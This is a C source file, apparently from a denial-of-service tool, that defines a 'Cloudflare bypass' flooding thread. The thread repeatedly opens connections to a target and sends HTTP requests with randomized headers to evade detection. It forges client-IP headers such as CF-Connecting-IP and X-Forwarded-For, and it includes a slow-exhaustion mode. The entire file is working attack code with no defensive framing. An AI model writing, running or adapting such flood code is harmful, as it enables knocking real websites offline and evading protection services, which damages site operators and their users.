#include "../include/elcienco.h"

extern volatile int attack_running;

void *cloudflare_bypass(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    AttackConfig cfg = data->config;
    
    printf("[CF Bypass Thread %d] Targeting Cloudflare-protected %s\n", 
           data->thread_num, cfg.target);
    
    // User agents that bypass basic Cloudflare filtering
    const char *user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    };
    
    const char *accept_encodings[] = {
        "gzip", "deflate", "br", "gzip, deflate, br", "identity"
    };
    
    const char *cache_controls[] = {
        "no-cache", "max-age=0", "no-store", "must-revalidate"
    };
    
    time_t start_time = time(NULL);
    unsigned long requests_sent = 0;
    
    while (attack_running && (time(NULL) - start_time) < cfg.duration) {
        int sock = create_tcp_socket();
        if (sock < 0) continue;
        
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(cfg.port);
        server_addr.sin_addr.s_addr = inet_addr(cfg.target);
        
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            char request[2048];
            
            // Rotate through different headers to avoid pattern detection
            const char *ua = user_agents[rand() % 5];
            const char *encoding = accept_encodings[rand() % 5];
            const char *cache = cache_controls[rand() % 4];
            
            // Cloudflare-specific bypass headers
            sprintf(request,
                "GET /?%d HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Accept-Encoding: %s\r\n"
                "Cache-Control: %s\r\n"
                "CF-Connecting-IP: %d.%d.%d.%d\r\n"
                "CF-IPCountry: US\r\n"
                "X-Forwarded-For: %d.%d.%d.%d\r\n"
                "X-Real-IP: %d.%d.%d.%d\r\n"
                "Connection: keep-alive\r\n"
                "Upgrade-Insecure-Requests: 1\r\n"
                "Pragma: no-cache\r\n"
                "\r\n",
                rand(), cfg.target, ua, encoding, cache,
                rand() % 255, rand() % 255, rand() % 255, rand() % 255,
                rand() % 255, rand() % 255, rand() % 255, rand() % 255,
                rand() % 255, rand() % 255, rand() % 255, rand() % 255
            );
            
            send(sock, request, strlen(request), 0);
            requests_sent++;
            
            // Keep connection alive for slow exhaustion
            if (cfg.method == 7) {
                usleep(100000); // 100ms delay for slow attack
            }
        }
        
        close(sock);
        
        if (requests_sent % 100 == 0) {
            usleep(1000);
        }
    }
    
    printf("[CF Bypass Thread %d] Finished. Requests sent: %lu\n", 
           data->thread_num, requests_sent);
    
    free(data);
    return NULL;
}
